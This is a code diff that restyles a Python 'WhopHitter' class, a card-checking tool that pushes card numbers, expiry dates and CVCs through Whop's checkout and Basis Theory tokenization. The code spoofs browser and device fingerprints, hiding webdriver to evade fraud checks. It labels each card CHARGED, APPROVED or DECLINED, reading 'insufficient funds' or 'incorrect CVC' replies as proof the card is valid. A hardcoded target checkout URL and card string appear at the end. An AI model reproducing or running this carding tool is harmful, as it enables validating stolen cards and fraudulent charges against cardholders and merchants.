-                    "Response": "INIT_EXCEPTION",
-                    "Status": "DECLINED",
-                    "CC": card,
-                    "Email": buyer_email,
-                    "Plan": plan_id,
-                    "Message": str(e),
-                    "Time": f"{time.time() - start_time:.2f}s"
-                }
+                return {"Response": "INIT_EXCEPTION", "Status": "DECLINED",
+                        "CC": card, "Email": buyer_email, "Plan": plan_id,
+                        "Message": str(e),
+                        "Time": f"{time.time() - start_time:.2f}s"}
 
-            # Containerized Basis Theory Card Tokenization with rotating device profile
+            # ═══════════════════════════════════════════════════════════
+            # BASIS THEORY TOKENIZATION
+            # ═══════════════════════════════════════════════════════════
             bt_headers = {
-                "user-agent": profile["ua"],
-                "bt-api-key": BT_API_KEY,
+                "user-agent": profile["ua"], "bt-api-key": BT_API_KEY,
                 "content-type": "application/json",
                 "origin": "https://js.basistheory.com",
             }
             device_info = {
-                "uaBrands": profile["uaBrands"],
-                "uaMobile": False,
-                "uaPlatform": profile["uaPlatform"],
-                "languages": ["en-US"],
-                "timeZone": "America/New_York",
-                "cookiesEnabled": True,
-                "localStorageEnabled": True,
-                "sessionStorageEnabled": True,
+                "uaBrands": profile["uaBrands"], "uaMobile": False,
+                "uaPlatform": profile["uaPlatform"], "languages": ["en-US"],
+                "timeZone": "America/New_York", "cookiesEnabled": True,
+                "localStorageEnabled": True, "sessionStorageEnabled": True,
                 "platform": profile["platform"],
                 "hardwareConcurrency": profile["hardwareConcurrency"],
                 "deviceMemoryGb": profile["deviceMemoryGb"],
-                "screenWidth": profile["width"],
-                "screenHeight": profile["height"],
-                "devicePixelRatio": 1.0,
-                "maxTouchPoints": 0,
-                "webdriver": False,
+                "screenWidth": profile["width"], "screenHeight": profile["height"],
+                "devicePixelRatio": 1.0, "maxTouchPoints": 0, "webdriver": False,
                 "webglVendor": profile["webglVendor"],
                 "webglRenderer": profile["webglRenderer"]
             }
 
             try:
-                # 1. Create BT session
                 r_bts = await client.post(
                     "https://js.basistheory.com/api/sessions",
-                    headers=bt_headers,
-                    json={"deviceInfo": device_info},
-                )
+                    headers=bt_headers, json={"deviceInfo": device_info})
                 bts_data = r_bts.json() if r_bts.status_code in (200, 201) else {}
                 session_key = bts_data.get("session_key")
                 nonce = bts_data.get("nonce")
-
                 if not session_key or not nonce:
-                    return {
-                        "Response": "BT_SESSION_FAILED",
-                        "Status": "DECLINED",
-                        "CC": card,
-                        "Email": buyer_email,
-                        "Plan": plan_id,
-                        "Message": f"Basis Theory session creation failed (HTTP {r_bts.status_code})",
-                        "Time": f"{time.time() - start_time:.2f}s"
-                    }
+                    return {"Response": "BT_SESSION_FAILED", "Status": "DECLINED",
+                            "CC": card, "Email": buyer_email, "Plan": plan_id,
+                            "Message": f"BT session failed (HTTP {r_bts.status_code})",
+                            "Time": f"{time.time() - start_time:.2f}s"}
 
-                # 2. Exchange nonce for merchant container
                 r_ws = await client.post(
                     "https://whop.com/api/v1/payment_method_types/card/session",
                     headers={**headers_common, "content-type": "application/json"},
-                    json={"account_id": account_id, "nonce": nonce}
-                )
+                    json={"account_id": account_id, "nonce": nonce})
                 ws_data = r_ws.json() if r_ws.status_code in (200, 201) else {}
                 container = ws_data.get("session", {}).get("container")
-
                 if not container:
-                    return {
-                        "Response": "CONTAINER_FAILED",
-                        "Status": "DECLINED",
-                        "CC": card,
-                        "Email": buyer_email,
-                        "Plan": plan_id,
-                        "Message": f"Card container exchange failed (HTTP {r_ws.status_code})",
-                        "Time": f"{time.time() - start_time:.2f}s"
-                    }
+                    return {"Response": "CONTAINER_FAILED", "Status": "DECLINED",
+                            "CC": card, "Email": buyer_email, "Plan": plan_id,
+                            "Message": f"Container exchange failed (HTTP {r_ws.status_code})",
+                            "Time": f"{time.time() - start_time:.2f}s"}
 
-                # 3. Tokenize card number with container
                 r_tok = await client.post(
                     "https://js.basistheory.com/api/tokens",
                     headers=bt_headers,
-                    json={"type": "card", "containers": [container], "data": {"number": cc}}
-                )
+                    json={"type": "card", "containers": [container],
+                          "data": {"number": cc}})
                 tok_data = r_tok.json() if r_tok.status_code in (200, 201) else {}
                 bt_token = tok_data.get("id")
-
                 if not bt_token:
-                    return {
-                        "Response": "TOKEN_ERROR",
-                        "Status": "DECLINED",
-                        "CC": card,
-                        "Email": buyer_email,
-                        "Plan": plan_id,
-                        "Message": "Failed to tokenize card into container",
-                        "Time": f"{time.time() - start_time:.2f}s"
-                    }
+                    return {"Response": "TOKEN_ERROR", "Status": "DECLINED",
+                            "CC": card, "Email": buyer_email, "Plan": plan_id,
+                            "Message": "Failed to tokenize card into container",
+                            "Time": f"{time.time() - start_time:.2f}s"}
 
-                # 4. Patch expiration and CVC
-                patch_headers = {
-                    **bt_headers,
-                    "bt-api-key": str(session_key),
-                    "content-type": "application/merge-patch+json",
-                }
+                patch_headers = {**bt_headers, "bt-api-key": str(session_key),
+                                 "content-type": "application/merge-patch+json"}
                 await client.patch(
                     f"https://js.basistheory.com/api/tokens/{bt_token}",
                     headers=patch_headers,
-                    json={"data": {"expiration_month": mm, "expiration_year": yy}}
-                )
+                    json={"data": {"expiration_month": mm, "expiration_year": yy}})
                 if cv:
                     await client.patch(
                         f"https://js.basistheory.com/api/tokens/{bt_token}",
                         headers=patch_headers,
-                        json={"data": {"cvc": str(cv).strip()}}
-                    )
-
+                        json={"data": {"cvc": str(cv).strip()}})
             except Exception as e:
-                return {
-                    "Response": "BT_EXCEPTION",
-                    "Status": "DECLINED",
-                    "CC": card,
-                    "Email": buyer_email,
-                    "Plan": plan_id,
-                    "Message": str(e),
-                    "Time": f"{time.time() - start_time:.2f}s"
-                }
+                return {"Response": "BT_EXCEPTION", "Status": "DECLINED",
+                        "CC": card, "Email": buyer_email, "Plan": plan_id,
+                        "Message": str(e),
+                        "Time": f"{time.time() - start_time:.2f}s"}
 
+            # ═══════════════════════════════════════════════════════════
+            # CONFIRMATION TOKEN + CONFIRM
+            # ═══════════════════════════════════════════════════════════
             conf_payload = {
                 "account_id": account_id,
-                "payment_method": {
-                    "type": "card",
-                    "category": "card",
-                    "card": {"token": bt_token}
-                },
+                "payment_method": {"type": "card", "category": "card",
+                                   "card": {"token": bt_token}},
                 "billing_details": {
-                    "email": buyer_email,
-                    "name": full_name,
+                    "email": buyer_email, "name": full_name,
                     "address": {
-                        "country": "US",
-                        "line1": billing_addr["line1"],
-                        "city": billing_addr["city"],
-                        "state": billing_addr["state"],
+                        "country": "US", "line1": billing_addr["line1"],
+                        "city": billing_addr["city"], "state": billing_addr["state"],
                         "postal_code": billing_addr["postal_code"]
                     }
                 },
-                "return_url": url,
-                "setup_future_usage": "off_session",
+                "return_url": url, "setup_future_usage": "off_session",
                 "browser_info": {
-                    "platform": profile["platform"],
-                    "color_depth": profile["depth"],
-                    "screen_height": profile["height"],
-                    "screen_width": profile["width"],
-                    "javascript_enabled": True,
-                    "language": "en-US",
-                    "java_enabled": False,
-                    "browser_time_difference": profile["tz"]
+                    "platform": profile["platform"], "color_depth": profile["depth"],
+                    "screen_height": profile["height"], "screen_width": profile["width"],
+                    "javascript_enabled": True, "language": "en-US",
+                    "java_enabled": False, "browser_time_difference": profile["tz"]
                 }
             }
 
@@ -797,31 +728,20 @@ class WhopHitter:
                 r_conf = await client.post(
                     "https://whop.com/api/v1/confirmation_tokens",
                     headers={**headers_common, "content-type": "application/json"},
-                    json=conf_payload
-                )
+                    json=conf_payload)
                 conf_data = r_conf.json() if r_conf.status_code in (200, 201) else {}
                 ctok_id = conf_data.get("id")
                 if not ctok_id:
                     err_msg = conf_data.get("message") or conf_data.get("error", "Failed to build confirmation token")
-                    return {
-                        "Response": "CONFIRM_TOKEN_FAILED",
-                        "Status": "DECLINED",
-                        "CC": card,
-                        "Email": buyer_email,
-                        "Plan": plan_id,
-                        "Message": str(err_msg),
-                        "Time": f"{time.time() - start_time:.2f}s"
-                    }
+                    return {"Response": "CONFIRM_TOKEN_FAILED", "Status": "DECLINED",
+                            "CC": card, "Email": buyer_email, "Plan": plan_id,
+                            "Message": str(err_msg),
+                            "Time": f"{time.time() - start_time:.2f}s"}
             except Exception as e:
-                return {
-                    "Response": "CONF_EXCEPTION",
-                    "Status": "DECLINED",
-                    "CC": card,
-                    "Email": buyer_email,
-                    "Plan": plan_id,
-                    "Message": str(e),
-                    "Time": f"{time.time() - start_time:.2f}s"
-                }
+                return {"Response": "CONF_EXCEPTION", "Status": "DECLINED",
+                        "CC": card, "Email": buyer_email, "Plan": plan_id,
+                        "Message": str(e),
+                        "Time": f"{time.time() - start_time:.2f}s"}
 
             confirm_payload = {
                 "client_secret": client_secret,
@@ -833,46 +753,32 @@ class WhopHitter:
                 r_confirm = await client.post(
                     f"https://whop.com/api/v1/checkout_sessions/{checkout_id}/confirm",
                     headers={**headers_common, "content-type": "application/json"},
-                    json=confirm_payload
-                )
+                    json=confirm_payload)
                 confirm_data = r_confirm.json() if r_confirm.status_code in (200, 201) else {}
             except Exception as e:
-                return {
-                    "Response": "CONFIRM_EXCEPTION",
-                    "Status": "DECLINED",
-                    "CC": card,
-                    "Email": buyer_email,
-                    "Plan": plan_id,
-                    "Message": str(e),
-                    "Time": f"{time.time() - start_time:.2f}s"
-                }
+                return {"Response": "CONFIRM_EXCEPTION", "Status": "DECLINED",
+                        "CC": card, "Email": buyer_email, "Plan": plan_id,
+                        "Message": str(e),
+                        "Time": f"{time.time() - start_time:.2f}s"}
 
-            # Check immediate confirm response
             last_err = confirm_data.get("last_confirm_error")
             if last_err:
                 err_msg = last_err.get("message") or last_err.get("code") or "Payment Confirmation Failed"
                 err_lower = err_msg.lower()
                 is_approved = any(k in err_lower for k in [
-                    "insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code"
-                ])
-                return {
-                    "Response": err_msg,
-                    "Status": "APPROVED" if is_approved else "DECLINED",
-                    "Gate": "Whop / Multi-PSP",
-                    "Plan": plan_id,
-                    "Email": buyer_email,
-                    "OTP": "N/A",
-                    "CC": f"{cc}|{mm:02d}|{yy}|{cv}",
-                    "Charged": "False",
-                    "Approved": str(is_approved),
-                    "Time": f"{time.time() - start_time:.2f}s"
-                }
+                    "insufficient funds", "incorrect cvc", "security code",
+                    "3d", "authenticate", "zip code"])
+                return {"Response": err_msg,
+                        "Status": "APPROVED" if is_approved else "DECLINED",
+                        "Gate": "Whop / Multi-PSP", "Plan": plan_id,
+                        "Email": buyer_email, "OTP": "N/A",
+                        "CC": f"{cc}|{mm:02d}|{yy}|{cv}",
+                        "Charged": "False", "Approved": str(is_approved),
+                        "Time": f"{time.time() - start_time:.2f}s"}
 
-            # Polling to observe actual payment settlement
             final_status = confirm_data.get("status", "unknown")
             final_message = ""
             is_charged = False
-            is_approved = False
 
             init_payment = confirm_data.get("payment") or {}
             if init_payment.get("status") == "succeeded":
@@ -885,8 +791,7 @@ class WhopHitter:
                     try:
                         r_poll = await client.get(
                             f"https://whop.com/api/v1/checkout_sessions/{checkout_id}?client_secret={client_secret}",
-                            headers=headers_common
-                        )
+                            headers=headers_common)
                         poll_data = r_poll.json()
                         final_status = poll_data.get("status", final_status)
                         payment = poll_data.get("payment") or {}
@@ -912,33 +817,23 @@ class WhopHitter:
 
             elapsed = time.time() - start_time
             if not final_message:
-                if is_charged:
-                    final_message = "Order Placed Successfully"
-                else:
-                    final_message = "Payment Processing / Incomplete"
+                final_message = "Order Placed Successfully" if is_charged else "Payment Processing / Incomplete"
 
             msg_lower = (final_message or "").lower()
             is_approved = is_charged or any(k in msg_lower for k in [
-                "insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code", "action_required"
-            ])
+                "insufficient funds", "incorrect cvc", "security code",
+                "3d", "authenticate", "zip code", "action_required"])
 
             status_label = "CHARGED" if is_charged else ("APPROVED" if is_approved else "DECLINED")
 
             return {
                 "Response": final_message if final_message else status_label,
-                "Status": status_label,
-                "Gate": "Whop / Multi-PSP",
-                "Plan": plan_id,
-                "Email": buyer_email,
-                "OTP": "N/A",
+                "Status": status_label, "Gate": "Whop / Multi-PSP",
+                "Plan": plan_id, "Email": buyer_email, "OTP": "N/A",
                 "CC": f"{cc}|{mm:02d}|{yy}|{cv}",
-                "Charged": str(is_charged),
-                "Approved": str(is_approved),
+                "Charged": str(is_charged), "Approved": str(is_approved),
                 "Time": f"{elapsed:.2f}s",
-                "Details": {
-                    "checkout_id": checkout_id,
-                    "final_status": final_status,
-                }
+                "Details": {"checkout_id": checkout_id, "final_status": final_status}
             }
 
 
@@ -946,12 +841,10 @@ if __name__ == "__main__":
     import sys
     target_url = "https://whop.com/arts-crypto-circle/arts-crypto-circle-monthly23/?a=wickyone"
     target_card = "4242424242424242|05|2028|123"
-
     if len(sys.argv) > 1:
         target_card = sys.argv[1]
     if len(sys.argv) > 2:
         target_url = sys.argv[2]
-
     hitter = WhopHitter()
     res = asyncio.run(hitter.hit(target_url, None, target_card))
     print(json.dumps(res, indent=2))
